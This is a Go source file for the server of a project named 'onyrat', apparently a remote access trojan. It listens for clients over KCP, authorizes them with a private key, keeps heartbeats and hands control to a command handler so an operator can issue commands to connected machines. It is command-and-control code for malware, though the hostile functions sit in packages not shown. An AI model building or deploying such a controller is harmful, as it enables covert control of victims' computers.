//go:build server
// +build server

package main

import (
	"context"
	"errors"
	"fmt"
	"net"

	"github.com/Onyz107/onyrat/internal/banner"
	"github.com/Onyz107/onyrat/internal/config"
	"github.com/Onyz107/onyrat/internal/logger"
	"github.com/Onyz107/onyrat/pkg/auth"
	"github.com/Onyz107/onyrat/pkg/commands"
	"github.com/Onyz107/onyrat/pkg/network"
	"github.com/sirupsen/logrus"
)

type clientHandler struct {
	Server *network.KCPServer
	Ctx    context.Context
	cancel context.CancelCauseFunc
	done   chan error
}

func (ch *clientHandler) Run() {
	inCtx, cancel := context.WithCancelCause(ch.Ctx)
	ch.cancel = cancel
	defer func() {
		if err := context.Cause(inCtx); err != nil && !errors.Is(err, context.Canceled) {
			ch.done <- fmt.Errorf("failed to handle client: %w", err)
		} else {
			ch.done <- nil
		}
	}()
	defer cancel(nil)

	for {
		select {

		case <-inCtx.Done():
			return

		default:
			c, err := ch.Server.AcceptClient()
			if err != nil {
				cancel(fmt.Errorf("failed to accept client: %w", err))
				return
			}
			logger.Log.Infof("Client %s accepted.", c)

			err = auth.ClientAuthorization(ch.Server, ch.Server.GetClient(c).Manager, config.ServerConfigs.PrivateKey)
			if err != nil {
				logger.Log.Errorf("failed to authorize client %s: %v", c, err)
				continue
			}

			heartbeatManager := network.HeartbeatManager{
				Communicator: ch.Server,
				Manager:      ch.Server.GetClient(c).Manager,
				Ctx:          ch.Server.GetClient(c).Ctx,
			}

			heartbeatManager.Start()
			defer heartbeatManager.Stop()
			go func() {
				if err := heartbeatManager.Wait(); err != nil {
					cancel(err)
					return
				}
			}()
		}
	}

}

func (ch *clientHandler) Start() {
	if ch.done == nil {
		ch.done = make(chan error, 1)
	}
	go ch.Run()
}

func (ch *clientHandler) Wait() error {
	if ch.done != nil {
		err := <-ch.done
		logger.Log.Debug("Received err")
		return err
	}
	logger.Log.Debug("done is nil")
	return fmt.Errorf("client handler not initialized")
}

func (ch *clientHandler) Stop() {
	if ch.cancel != nil {
		ch.cancel(fmt.Errorf("stopped by user"))
	}
	ch.cancel = nil // Make nil so we do not error if Stop is called again after being initilized for only once
}

func main() {
	logger.Log.SetLevel(logrus.DebugLevel)

	fmt.Println()
	banner.PrintBanner()
	fmt.Println()

	ctx, cancel := context.WithCancelCause(context.Background())
	defer cancel(nil)

	server, err := network.NewServer(net.JoinHostPort(config.ServerConfigs.Host, config.ServerConfigs.Port), ctx)
	if err != nil {
		logger.Log.Error(err)
		return
	}
	defer server.Close()

	logger.Log.Infof("Server started listening on: %s", net.JoinHostPort(config.ServerConfigs.Host, config.ServerConfigs.Port))

	clientHandler := clientHandler{
		Server: server,
		Ctx:    ctx,
	}
	clientHandler.Start()
	defer clientHandler.Stop()
	go func() {
		if err := clientHandler.Wait(); err != nil {
			cancel(err)
			logger.Log.Error(err)
		}
	}()

	commandHandler := commands.CommandHandler{
		Communicator: server,
		Ctx:          ctx,
	}

	commandHandler.StartServer()
	defer commandHandler.StopServer()

	if err := commandHandler.WaitServer(); err != nil {
		cancel(err)
		logger.Log.Error(err)
	}
}
